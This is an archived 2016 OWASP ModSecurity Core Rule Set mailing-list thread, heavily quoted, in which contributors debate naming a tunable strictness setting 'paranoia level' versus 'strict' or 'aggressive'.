> The Merriam-Wester dictionary has multiple definitions for paranoia.
> One of them is:
> "a tendency on the part of an individual or group toward excessive or
> irrational suspiciousness and distrustfulness of others"
> 
> I think the adjectives "excessive", "irrational" "distrustful"
> characterise our new functionality very well: When raising the level,
> you are enabling additional rules, which will cause an excessive number
> of false positives due to a general distrustful attitude towards user
> submitted input.
> 
> Ideally, two years down the line, ModSecurity (Core Rules) discussion
> will run like this:
> "Man, I should install ModSecurity and the Core Rules on my server,
> but I heard false positives are going to kill me."
> "No worries, as long as you keep the paranoia setting low, false
> positives are minimal."
> 
> Two weeks ago, the register ran a story about
> Rob Joyce, head of NSA's Tailored Access Operations:
> http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explains_how_to_protect_your_network_from_his_minions/
> The article closed with the register quoting Joyce:
> "At the end of the day it all boils down to knowing your network,
> he said, and it?s vital that IT administrators pick up their game
> and get paranoid about attacks."
> 
> Well said. And the core rules paranoia feature is going to help
> with this in a controlled way without killing you with
> false positives on the first day of the installation.
> 
> But let's look at the alternatives: "Strict" has been named as
> a better term. I do not like strict. It implies that the standard
> installation is not strict. Or that the default rules were not
> strict. In fact they are very strict. Every single one of them.
> It's just that they are more focused on less delicate aspects
> of the requests.
> 
> So I think the term does not work as it misleads the user into
> making the wrong assumptions. You could say that running
> the CRS in anomaly scoring mode and setting a threshold of >5
> is un-strict. But the individual rules are all strict from my
> point of view.
> 
> This is even more true, as we have Ryan Barnett's proposal to
> use "aggressive". I think aggressive trumps strict as it
> sounds more like a gradual setting in my ears (both terms
> exist in German as well, so maybe these are false friends
> for me and their meaning is a wee bit different in English).
> 
> So this the new featureset would allow us to adjust how aggressive the
> core rule set is. That does not sound too bad. It reminds me of a "teeth
> metaphor" is use at times. A strong ruleset has strong teeth. By tuning
> false positives, you pull a few of the teeth while keeping most of them
> in place. The level of aggression adjusting with this new setting, would
> thus add more teeth and the ruleset would thus become more aggressive. I
> guess it's not overly wrong to think of piranhas in a pond.
> 
> The root of the term comes with the idea of active defense.
> It lets me thing of a strike back. Look up the term
> aggressive on The Merriam Webster dictionary. All the
> definitions point in that direction:
> http://www.merriam-webster.com/dictionary/aggressive
> Aggressive always means that you not only defend, but you attack
> as well.
> 
> (paranoia is entirely different in this regard. It does not
> imply any counter strike)
> 
> So I think aggressive does not entirely meet the character of the new
> functionality, which is in line with the rest of the core rules set in
> being entirely defensive. It just block attacks. It absolutely does not
> attempt to shut down the client, inject malware into the response or
> launch a DoS attack against the source IP address (which would all be
> possible with the right set of rules).
> 
> And what would be the complete term? Level of Aggression or
> Level of Aggressiveness, Aggressiveness Setting? That all springs
> to mind. And that just does not sounds very cool in my ears.
> Or outrightly negative ("Level of Aggression!").
> 
> So all in all, I think we should work with paranoia. It's the best
> I can think of right now. And I thought about this a lot.
> 
> But now let me hear what you think about it!
> 
> Please do not take too long. My first pull request is almost
> ready, so let's come to a resolution in the next few days.
> 
> Best regards,
> 
> Christian
> 
> 
> --
> Any technology that does not appear magical is insufficiently
> advanced.
> -- Gregory Benford
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 801 bytes
Desc: Message signed with OpenPGP using GPGMail
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160218/c4e42bd7/attachment.pgp>

From christian.folini at netnea.com  Thu Feb 18 13:37:07 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 18 Feb 2016 14:37:07 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <91E281C0-EA66-4236-8A26-43DAD4808CFC@noelzindel.org>
References: <20160218121301.GA5039@elias>
	<91E281C0-EA66-4236-8A26-43DAD4808CFC@noelzindel.org>
Message-ID: <20160218133707.GB8625@elias>

On Thu, Feb 18, 2016 at 02:23:17PM +0100, No?l Zindel wrote:
> Thanks Christian, for this statement. It?s encouraging to see how much effort you put into this.

Thank you, No?l. For me, it is encouraging to read, my ideas
are not completely crazy.

Ahoj,

Christian


-- 
Complexity is the worst enemy of security, and the Internet -- 
and the computers and processes connected to it -- is getting
more complex all the time.
-- Bruce Schneier
-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 181 bytes
Desc: Digital signature
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160218/09d50cd9/attachment.pgp>

From modsec at spam.lifeforms.nl  Fri Feb 19 19:30:27 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Fri, 19 Feb 2016 20:30:27 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
	question
In-Reply-To: <20160218121301.GA5039@elias>
References: <20160218121301.GA5039@elias>
Message-ID: <56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>

Hi Christian,

You make some very good points! Meanwhile there seems to be a correlation between the length of a mailinglist post and the number of replies ;) I?m not too bothered with the name, I originally offered ?strict? but I can live perfectly with paranoia!

Cheers,
WH

> On 18 Feb 2016, at 13:13, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Hello,
> 
> We have finished the list of rule candidates for our little
> pet project. I have a working implementation under
> https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode
> and I think it is time to sort out the naming question
> before submitting the first pull request with the basic mechanics.
> (-> see https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
> for an explanation of the 4 pull requests planned)
> 
> I started out this project with the idea of an "on/off" setting.
> Hence the idea of "mode". However, it became clear we are going
> to work with a "level" ranging from 0-4 instead. So the idea of
> "mode" no longer really applies. We need to find something better.
> 
> But of course, the core question is, if this should be called
> paranoia, paranoid, strict or agressive or something else.
> 
> I opted for paranoia from the start and I still think it is the
> right term. However, there has been opposition and we need to find
> a solution everybody can agree with. I also think this is an
> important discussion, as it is a non-technical discussion. So
> everybody can chime in without being an expert and without running
> lengthy tests in his lab.
> 
> Let me open the discussion with my reasoning why "paranoia" is the
> right term. I will then continue to discuss the other options
> and then you can respond and tell me why I am wrong and why the
> other options are much better suited....
> 
> "Paranoia" is the new normal. The more the attacks evolve and the
> more servers we configure, the more we realise, there is no real
> security without being paranoid. So while paranoia used to be
> a negative term, it is getting a more and more positive connotation;
> especially in IT security.
> Google the terms 
> paranoid information security 
> and you will get 2M hits. One of the top ones is
> http://www.darkreading.com/operations/the-perfect-infosec-mindset-paranoia-+-skepticism/a/d-id/1297596
> where the author says paranoia is the standard mindset now 
> (hence paranoia mode) and that you need to pair this with
> skepticism (in other words: the tuning of your ruleset).
> 
> Other hits include the following titles:
> 13 Security and Privacy Tips for the Truly Paranoid
> Security for the Paranoid - SecurityFocus
> I became paranoid with computer security issues, I always ...
> The paranoid CISO | CSO Online
> Computer-Security Paranoia
> openssl - How paranoid should the average user be about ...
> 
> Looking through some of these hits, I get the felling that those
> who really care about security acknowledge that they are paranoid
> and that they think that is the right attitude.
> 
> I also remember reading about paranoid security settings 10-20 years ago
> and I would skip them immediately. Now, when looking at a new software
> or product, the term paranoia immediately catches my eye and I read
> about the most paranoid options first and then decide if the product is
> any good. Without paranoia options, I think it must be a happy sunshine
> hippy thing.
> 
> Additionally, the term "PARANOID_MODE" is already there, even if it has
> not been in wide use in the 2.2.X series of rules:
> 
> 2.2.X> grep -r -i paranoi | wc -l
> 9
> 
> The Merriam-Wester dictionary has multiple definitions for paranoia.
> One of them is:
> "a tendency on the part of an individual or group toward excessive or
> irrational suspiciousness and distrustfulness of others"
> 
> I think the adjectives "excessive", "irrational" "distrustful"
> characterise our new functionality very well: When raising the level,
> you are enabling additional rules, which will cause an excessive number
> of false positives due to a general distrustful attitude towards user
> submitted input.
> 
> Ideally, two years down the line, ModSecurity (Core Rules) discussion
> will run like this:
> "Man, I should install ModSecurity and the Core Rules on my server,
> but I heard false positives are going to kill me."
> "No worries, as long as you keep the paranoia setting low, false
> positives are minimal."
> 
> Two weeks ago, the register ran a story about 
> Rob Joyce, head of NSA's Tailored Access Operations:
> http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explains_how_to_protect_your_network_from_his_minions/
> The article closed with the register quoting Joyce:
> "At the end of the day it all boils down to knowing your network, 
> he said, and it?s vital that IT administrators pick up their game 
> and get paranoid about attacks."
> 
> Well said. And the core rules paranoia feature is going to help
> with this in a controlled way without killing you with
> false positives on the first day of the installation.
> 
> But let's look at the alternatives: "Strict" has been named as
> a better term. I do not like strict. It implies that the standard
> installation is not strict. Or that the default rules were not
> strict. In fact they are very strict. Every single one of them.
> It's just that they are more focused on less delicate aspects
> of the requests. 
> 
> So I think the term does not work as it misleads the user into
> making the wrong assumptions. You could say that running
> the CRS in anomaly scoring mode and setting a threshold of >5
> is un-strict. But the individual rules are all strict from my
> point of view.
> 
> This is even more true, as we have Ryan Barnett's proposal to
> use "aggressive". I think aggressive trumps strict as it 
> sounds more like a gradual setting in my ears (both terms
> exist in German as well, so maybe these are false friends
> for me and their meaning is a wee bit different in English).
> 
> So this the new featureset would allow us to adjust how aggressive the
> core rule set is. That does not sound too bad. It reminds me of a "teeth
> metaphor" is use at times. A strong ruleset has strong teeth. By tuning
> false positives, you pull a few of the teeth while keeping most of them
> in place. The level of aggression adjusting with this new setting, would
> thus add more teeth and the ruleset would thus become more aggressive. I
> guess it's not overly wrong to think of piranhas in a pond.
> 
> The root of the term comes with the idea of active defense.
> It lets me thing of a strike back. Look up the term
> aggressive on The Merriam Webster dictionary. All the
> definitions point in that direction:
> http://www.merriam-webster.com/dictionary/aggressive
> Aggressive always means that you not only defend, but you attack
> as well.
> 
> (paranoia is entirely different in this regard. It does not
> imply any counter strike)
> 
> So I think aggressive does not entirely meet the character of the new
> functionality, which is in line with the rest of the core rules set in
> being entirely defensive. It just block attacks. It absolutely does not
> attempt to shut down the client, inject malware into the response or
> launch a DoS attack against the source IP address (which would all be
> possible with the right set of rules).
> 
> And what would be the complete term? Level of Aggression or 
> Level of Aggressiveness, Aggressiveness Setting? That all springs
> to mind. And that just does not sounds very cool in my ears.
> Or outrightly negative ("Level of Aggression!").
> 
> So all in all, I think we should work with paranoia. It's the best
> I can think of right now. And I thought about this a lot.
> 
> But now let me hear what you think about it!
> 
> Please do not take too long. My first pull request is almost
> ready, so let's come to a resolution in the next few days.
> 
> Best regards,
> 
> Christian
> 
> 
> -- 
> Any technology that does not appear magical is insufficiently
> advanced.         
> -- Gregory Benford
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160219/eb78f63e/attachment.html>

From franziska.buehler.schmocker at gmail.com  Fri Feb 19 20:55:59 2016
From: franziska.buehler.schmocker at gmail.com (Franziska Buehler)
Date: Fri, 19 Feb 2016 21:55:59 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
	question
In-Reply-To: <56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
Message-ID: <CALrdzmJpQn=Bxi3ZiyGVdtKk7SptjSkWLXb7AXN1ADpNC==jsA@mail.gmail.com>

Hello,

I like the term 'paranoia level' the most. It doesn't sound negative
to me. And during these discussions I already got used to it.

The term strict I like a little less. We often hear the word
combination ?strict mode? which can either have the state disabled or
enabled, 0 or 1. But that?s my interpretation.
In contrast, I think the term paranoia intuitively allows multiple
levels. How much we protect or defend ourselves depends on how
paranoid we are.

I don't like aggressive. The term aggressive implies violence. But
that, again, is just my feeling.

I would choose 'paranoia level'. But I could also live with strict.

Regards,
Franziska

2016-02-19 20:30 GMT+01:00 Walter Hop <modsec at spam.lifeforms.nl>:
> Hi Christian,
>
> You make some very good points! Meanwhile there seems to be a correlation
> between the length of a mailinglist post and the number of replies ;) I?m
> not too bothered with the name, I originally offered ?strict? but I can live
> perfectly with paranoia!
>
> Cheers,
> WH
>
> On 18 Feb 2016, at 13:13, Christian Folini <christian.folini at netnea.com>
> wrote:
>
> Hello,
>
> We have finished the list of rule candidates for our little
> pet project. I have a working implementation under
> https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode
> and I think it is time to sort out the naming question
> before submitting the first pull request with the basic mechanics.
> (-> see https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
> for an explanation of the 4 pull requests planned)
>
> I started out this project with the idea of an "on/off" setting.
> Hence the idea of "mode". However, it became clear we are going
> to work with a "level" ranging from 0-4 instead. So the idea of
> "mode" no longer really applies. We need to find something better.
>
> But of course, the core question is, if this should be called
> paranoia, paranoid, strict or agressive or something else.
>
> I opted for paranoia from the start and I still think it is the
> right term. However, there has been opposition and we need to find
> a solution everybody can agree with. I also think this is an
> important discussion, as it is a non-technical discussion. So
> everybody can chime in without being an expert and without running
> lengthy tests in his lab.
>
> Let me open the discussion with my reasoning why "paranoia" is the
> right term. I will then continue to discuss the other options
> and then you can respond and tell me why I am wrong and why the
> other options are much better suited....
>
> "Paranoia" is the new normal. The more the attacks evolve and the
> more servers we configure, the more we realise, there is no real
> security without being paranoid. So while paranoia used to be
> a negative term, it is getting a more and more positive connotation;
> especially in IT security.
> Google the terms
> paranoid information security
> and you will get 2M hits. One of the top ones is
> http://www.darkreading.com/operations/the-perfect-infosec-mindset-paranoia-+-skepticism/a/d-id/1297596
> where the author says paranoia is the standard mindset now
> (hence paranoia mode) and that you need to pair this with
> skepticism (in other words: the tuning of your ruleset).
>
> Other hits include the following titles:
> 13 Security and Privacy Tips for the Truly Paranoid
> Security for the Paranoid - SecurityFocus
> I became paranoid with computer security issues, I always ...
> The paranoid CISO | CSO Online
> Computer-Security Paranoia
> openssl - How paranoid should the average user be about ...
>
> Looking through some of these hits, I get the felling that those
> who really care about security acknowledge that they are paranoid
> and that they think that is the right attitude.
>
> I also remember reading about paranoid security settings 10-20 years ago
> and I would skip them immediately. Now, when looking at a new software
> or product, the term paranoia immediately catches my eye and I read
> about the most paranoid options first and then decide if the product is
> any good. Without paranoia options, I think it must be a happy sunshine
> hippy thing.
>
> Additionally, the term "PARANOID_MODE" is already there, even if it has
> not been in wide use in the 2.2.X series of rules:
>
> 2.2.X> grep -r -i paranoi | wc -l
> 9
>
> The Merriam-Wester dictionary has multiple definitions for paranoia.
> One of them is:
> "a tendency on the part of an individual or group toward excessive or
> irrational suspiciousness and distrustfulness of others"
>
> I think the adjectives "excessive", "irrational" "distrustful"
> characterise our new functionality very well: When raising the level,
> you are enabling additional rules, which will cause an excessive number
> of false positives due to a general distrustful attitude towards user
> submitted input.
>
> Ideally, two years down the line, ModSecurity (Core Rules) discussion
> will run like this:
> "Man, I should install ModSecurity and the Core Rules on my server,
> but I heard false positives are going to kill me."
> "No worries, as long as you keep the paranoia setting low, false
> positives are minimal."
>
> Two weeks ago, the register ran a story about
> Rob Joyce, head of NSA's Tailored Access Operations:
> http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explains_how_to_protect_your_network_from_his_minions/
> The article closed with the register quoting Joyce:
> "At the end of the day it all boils down to knowing your network,
> he said, and it?s vital that IT administrators pick up their game
> and get paranoid about attacks."
>
> Well said. And the core rules paranoia feature is going to help
> with this in a controlled way without killing you with
> false positives on the first day of the installation.
>
> But let's look at the alternatives: "Strict" has been named as
> a better term. I do not like strict. It implies that the standard
> installation is not strict. Or that the default rules were not
> strict. In fact they are very strict. Every single one of them.
> It's just that they are more focused on less delicate aspects
> of the requests.
>
> So I think the term does not work as it misleads the user into
> making the wrong assumptions. You could say that running
> the CRS in anomaly scoring mode and setting a threshold of >5
> is un-strict. But the individual rules are all strict from my
> point of view.
>
> This is even more true, as we have Ryan Barnett's proposal to
> use "aggressive". I think aggressive trumps strict as it
> sounds more like a gradual setting in my ears (both terms
> exist in German as well, so maybe these are false friends
> for me and their meaning is a wee bit different in English).
>
> So this the new featureset would allow us to adjust how aggressive the
> core rule set is. That does not sound too bad. It reminds me of a "teeth
> metaphor" is use at times. A strong ruleset has strong teeth. By tuning
> false positives, you pull a few of the teeth while keeping most of them
> in place. The level of aggression adjusting with this new setting, would
> thus add more teeth and the ruleset would thus become more aggressive. I
> guess it's not overly wrong to think of piranhas in a pond.
>
> The root of the term comes with the idea of active defense.
> It lets me thing of a strike back. Look up the term
> aggressive on The Merriam Webster dictionary. All the
> definitions point in that direction:
> http://www.merriam-webster.com/dictionary/aggressive
> Aggressive always means that you not only defend, but you attack
> as well.
>
> (paranoia is entirely different in this regard. It does not
> imply any counter strike)
>
> So I think aggressive does not entirely meet the character of the new
> functionality, which is in line with the rest of the core rules set in
> being entirely defensive. It just block attacks. It absolutely does not
> attempt to shut down the client, inject malware into the response or
> launch a DoS attack against the source IP address (which would all be
> possible with the right set of rules).
>
> And what would be the complete term? Level of Aggression or
> Level of Aggressiveness, Aggressiveness Setting? That all springs
> to mind. And that just does not sounds very cool in my ears.
> Or outrightly negative ("Level of Aggression!").
>
> So all in all, I think we should work with paranoia. It's the best
> I can think of right now. And I thought about this a lot.
>
> But now let me hear what you think about it!
>
> Please do not take too long. My first pull request is almost
> ready, so let's come to a resolution in the next few days.
>
> Best regards,
>
> Christian
>
>
> --
> Any technology that does not appear magical is insufficiently
> advanced.
> -- Gregory Benford
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>
>
> --
> Walter Hop | PGP key: https://lifeforms.nl/pgp
>
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>

From christian.folini at netnea.com  Sat Feb 20 05:45:56 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sat, 20 Feb 2016 06:45:56 +0100
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
Message-ID: <20160220054556.GB25666@elias>

Hello Walter,

Thank you for you heads up. You are probably right about the
length of the message. I wanted to put as many arguments
on the table as possible. But now I fear I have silenced
the opposition. 

Hopefully, Manuel and Chaim find time for a message sooner
or later.

Ahoj,

Christian

On Fri, Feb 19, 2016 at 08:30:27PM +0100, Walter Hop wrote:
> Hi Christian,
> 
> You make some very good points! Meanwhile there seems to be a correlation between the length of a mailinglist post and the number of replies ;) I?m not too bothered with the name, I originally offered ?strict? but I can live perfectly with paranoia!
> 
> Cheers,
> WH
> 
> > On 18 Feb 2016, at 13:13, Christian Folini <christian.folini at netnea.com> wrote:
> > 
> > Hello,
> > 
> > We have finished the list of rule candidates for our little
> > pet project. I have a working implementation under
> > https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode
> > and I think it is time to sort out the naming question
> > before submitting the first pull request with the basic mechanics.
> > (-> see https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
> > for an explanation of the 4 pull requests planned)
> > 
> > I started out this project with the idea of an "on/off" setting.
> > Hence the idea of "mode". However, it became clear we are going
> > to work with a "level" ranging from 0-4 instead. So the idea of
> > "mode" no longer really applies. We need to find something better.
> > 
> > But of course, the core question is, if this should be called
> > paranoia, paranoid, strict or agressive or something else.
> > 
> > I opted for paranoia from the start and I still think it is the
> > right term. However, there has been opposition and we need to find
> > a solution everybody can agree with. I also think this is an
> > important discussion, as it is a non-technical discussion. So
> > everybody can chime in without being an expert and without running
> > lengthy tests in his lab.
> > 
> > Let me open the discussion with my reasoning why "paranoia" is the
> > right term. I will then continue to discuss the other options
> > and then you can respond and tell me why I am wrong and why the
> > other options are much better suited....
> > 
> > "Paranoia" is the new normal. The more the attacks evolve and the
> > more servers we configure, the more we realise, there is no real
> > security without being paranoid. So while paranoia used to be
> > a negative term, it is getting a more and more positive connotation;
> > especially in IT security.
> > Google the terms 
> > paranoid information security 
> > and you will get 2M hits. One of the top ones is
> > http://www.darkreading.com/operations/the-perfect-infosec-mindset-paranoia-+-skepticism/a/d-id/1297596
> > where the author says paranoia is the standard mindset now 
> > (hence paranoia mode) and that you need to pair this with
> > skepticism (in other words: the tuning of your ruleset).
> > 
> > Other hits include the following titles:
> > 13 Security and Privacy Tips for the Truly Paranoid
> > Security for the Paranoid - SecurityFocus
> > I became paranoid with computer security issues, I always ...
> > The paranoid CISO | CSO Online
> > Computer-Security Paranoia
> > openssl - How paranoid should the average user be about ...
> > 
> > Looking through some of these hits, I get the felling that those
> > who really care about security acknowledge that they are paranoid
> > and that they think that is the right attitude.
> > 
> > I also remember reading about paranoid security settings 10-20 years ago
> > and I would skip them immediately. Now, when looking at a new software
> > or product, the term paranoia immediately catches my eye and I read
> > about the most paranoid options first and then decide if the product is
> > any good. Without paranoia options, I think it must be a happy sunshine
> > hippy thing.
> > 
> > Additionally, the term "PARANOID_MODE" is already there, even if it has
> > not been in wide use in the 2.2.X series of rules:
> > 
> > 2.2.X> grep -r -i paranoi | wc -l
> > 9
> > 
> > The Merriam-Wester dictionary has multiple definitions for paranoia.
> > One of them is:
> > "a tendency on the part of an individual or group toward excessive or
> > irrational suspiciousness and distrustfulness of others"
> > 
> > I think the adjectives "excessive", "irrational" "distrustful"
> > characterise our new functionality very well: When raising the level,
> > you are enabling additional rules, which will cause an excessive number
> > of false positives due to a general distrustful attitude towards user
> > submitted input.
> > 
> > Ideally, two years down the line, ModSecurity (Core Rules) discussion
> > will run like this:
> > "Man, I should install ModSecurity and the Core Rules on my server,
> > but I heard false positives are going to kill me."
> > "No worries, as long as you keep the paranoia setting low, false
> > positives are minimal."
> > 
> > Two weeks ago, the register ran a story about 
> > Rob Joyce, head of NSA's Tailored Access Operations:
> > http://www.theregister.co.uk/2016/01/28/nsas_top_hacking_boss_explains_how_to_protect_your_network_from_his_minions/
> > The article closed with the register quoting Joyce:
> > "At the end of the day it all boils down to knowing your network, 
> > he said, and it?s vital that IT administrators pick up their game 
> > and get paranoid about attacks."
> > 
> > Well said. And the core rules paranoia feature is going to help
> > with this in a controlled way without killing you with
> > false positives on the first day of the installation.
> > 
> > But let's look at the alternatives: "Strict" has been named as
> > a better term. I do not like strict. It implies that the standard
> > installation is not strict. Or that the default rules were not
> > strict. In fact they are very strict. Every single one of them.
> > It's just that they are more focused on less delicate aspects
> > of the requests. 
> > 
> > So I think the term does not work as it misleads the user into
> > making the wrong assumptions. You could say that running
> > the CRS in anomaly scoring mode and setting a threshold of >5
> > is un-strict. But the individual rules are all strict from my
> > point of view.
> > 
> > This is even more true, as we have Ryan Barnett's proposal to
> > use "aggressive". I think aggressive trumps strict as it 
> > sounds more like a gradual setting in my ears (both terms
> > exist in German as well, so maybe these are false friends
> > for me and their meaning is a wee bit different in English).
> > 
> > So this the new featureset would allow us to adjust how aggressive the
> > core rule set is. That does not sound too bad. It reminds me of a "teeth
> > metaphor" is use at times. A strong ruleset has strong teeth. By tuning
> > false positives, you pull a few of the teeth while keeping most of them
> > in place. The level of aggression adjusting with this new setting, would
> > thus add more teeth and the ruleset would thus become more aggressive. I
> > guess it's not overly wrong to think of piranhas in a pond.
> > 
> > The root of the term comes with the idea of active defense.
> > It lets me thing of a strike back. Look up the term
> > aggressive on The Merriam Webster dictionary. All the
> > definitions point in that direction:
> > http://www.merriam-webster.com/dictionary/aggressive
> > Aggressive always means that you not only defend, but you attack
> > as well.
> > 
> > (paranoia is entirely different in this regard. It does not
> > imply any counter strike)
> > 
> > So I think aggressive does not entirely meet the character of the new
> > functionality, which is in line with the rest of the core rules set in
> > being entirely defensive. It just block attacks. It absolutely does not
> > attempt to shut down the client, inject malware into the response or
> > launch a DoS attack against the source IP address (which would all be
> > possible with the right set of rules).
> > 
> > And what would be the complete term? Level of Aggression or 
> > Level of Aggressiveness, Aggressiveness Setting? That all springs
> > to mind. And that just does not sounds very cool in my ears.
> > Or outrightly negative ("Level of Aggression!").
> > 
> > So all in all, I think we should work with paranoia. It's the best
> > I can think of right now. And I thought about this a lot.
> > 
> > But now let me hear what you think about it!
> > 
> > Please do not take too long. My first pull request is almost
> > ready, so let's come to a resolution in the next few days.
> > 
> > Best regards,
> > 
> > Christian
> > 
> > 
> > -- 
> > Any technology that does not appear magical is insufficiently
> > advanced.         
> > -- Gregory Benford
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> 
> -- 
> Walter Hop | PGP key: https://lifeforms.nl/pgp
> 

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From Manuel.LeosRivas at gemalto.com  Sat Feb 20 09:37:12 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Sat, 20 Feb 2016 09:37:12 +0000
Subject: [Owasp-modsecurity-core-rule-set] The paranoia mode naming
 question
In-Reply-To: <20160220054556.GB25666@elias>
References: <20160218121301.GA5039@elias>
	<56DABD87-2C4C-45ED-8D7B-425F4E9F808F@spam.lifeforms.nl>
	<20160220054556.GB25666@elias>
Message-ID: <E2C9913D99137A42A2A9646B1E82B8DB010D44CC81@A1GTOEMBXV001.gto.a3c.atos.net>

I like paranoia, who's not these days? Or do you trust developer's secure coding style???

-----Original Message-----
From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Christian Folini
Sent: samedi 20 f?vrier 2016 06:46
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] The paranoia mode naming question

Hello Walter,

Thank you for you heads up. You are probably right about the length of the message. I wanted to put as many arguments on the table as possible. But now I fear I have silenced the opposition.

Hopefully, Manuel and Chaim find time for a message sooner or later.

Ahoj,

Christian

On Fri, Feb 19, 2016 at 08:30:27PM +0100, Walter Hop wrote:
> Hi Christian,
>
> You make some very good points! Meanwhile there seems to be a correlation between the length of a mailinglist post and the number of replies ;) I?m not too bothered with the name, I originally offered ?strict? but I can live perfectly with paranoia!
>
> Cheers,
> WH
>
> > On 18 Feb 2016, at 13:13, Christian Folini <christian.folini at netnea.com> wrote:
> >
> > Hello,
> >
> > We have finished the list of rule candidates for our little pet
> > project. I have a working implementation under
> > https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode
> > and I think it is time to sort out the naming question before
> > submitting the first pull request with the basic mechanics.
> > (-> see
> > https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode
> > for an explanation of the 4 pull requests planned)
> >
> > I started out this project with the idea of an "on/off" setting.
> > Hence the idea of "mode". However, it became clear we are going to
> > work with a "level" ranging from 0-4 instead. So the idea of "mode"
> > no longer really applies. We need to find something better.
> >
> > But of course, the core question is, if this should be called
> > paranoia, paranoid, strict or agressive or something else.
> >
> > I opted for paranoia from the start and I still think it is the
> > right term. However, there has been opposition and we need to find a
> > solution everybody can agree with. I also think this is an important
> > discussion, as it is a non-technical discussion. So everybody can
> > chime in without being an expert and without running lengthy tests
> > in his lab.
> >
> > Let me open the discussion with my reasoning why "paranoia" is the
> > right term. I will then continue to discuss the other options and
> > then you can respond and tell me why I am wrong and why the other
> > options are much better suited....
> >
> > "Paranoia" is the new normal. The more the attacks evolve and the
> > more servers we configure, the more we realise, there is no real
> > security without being paranoid. So while paranoia used to be a
> > negative term, it is getting a more and more positive connotation;
> > especially in IT security.
> > Google the terms
> > paranoid information security
> > and you will get 2M hits. One of the top ones is
> > http://www.darkreading.com/operations/the-perfect-infosec-mindset-pa
> > ranoia-+-skepticism/a/d-id/1297596
> > where the author says paranoia is the standard mindset now (hence
> > paranoia mode) and that you need to pair this with skepticism (in
> > other words: the tuning of your ruleset).
> >
> > Other hits include the following titles:
> > 13 Security and Privacy Tips for the Truly Paranoid Security for the
> > Paranoid - SecurityFocus I became paranoid with computer security
> > issues, I always ...
> > The paranoid CISO | CSO Online
> > Computer-Security Paranoia
> > openssl - How paranoid should the average user be about ...
> >
> > Looking through some of these hits, I get the felling that those who
> > really care about security acknowledge that they are paranoid and
> > that they think that is the right attitude.
> >
> > I also remember reading about paranoid security settings 10-20 years
> > ago and I would skip them immediately. Now, when looking at a new
> > software or product, the term paranoia immediately catches my eye
> > and I read about the most paranoid options first and then decide if
> > the product is any good. Without paranoia options, I think it must
> > be a happy sunshine hippy thing.
> >
> > Additionally, the term "PARANOID_MODE" is already there, even if it
> > has not been in wide use in the 2.2.X series of rules:
> >
> > 2.2.X> grep -r -i paranoi | wc -l
> > 9
> >
> > The Merriam-Wester dictionary has multiple definitions for paranoia.
> > One of them is:
> > "a tendency on the part of an individual or group toward excessive
> > or irrational suspiciousness and distrustfulness of others"
> >
> > I think the adjectives "excessive", "irrational" "distrustful"
> > characterise our new functionality very well: When raising the
> > level, you are enabling additional rules, which will cause an
> > excessive number of false positives due to a general distrustful
